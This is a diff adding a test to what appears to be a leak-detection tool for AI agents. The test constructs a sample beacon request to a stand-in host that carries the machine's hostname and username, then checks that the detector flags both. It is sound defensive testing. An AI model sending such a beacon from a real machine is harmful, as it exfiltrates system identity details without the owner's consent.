@@ -72,3 +72,12 @@ def test_destructive_commands_are_hard_flags(command):
 )  # fmt: skip
 def test_ordinary_commands_are_not_flagged(command):
     assert command_flags([command]) == []
+
+
+def test_sending_the_machines_hostname_is_a_leak():
+    from agenttrap.canary import generate
+
+    c = generate()
+    beacon = Request("GET", f"https://x.test/ping?h={c.hostname}&u={c.values['$USER']}", {}, "")
+    leaks = find_leaks([beacon], c.values)
+    assert {leak.canary for leak in leaks} == {"$HOSTNAME", "$USER"}
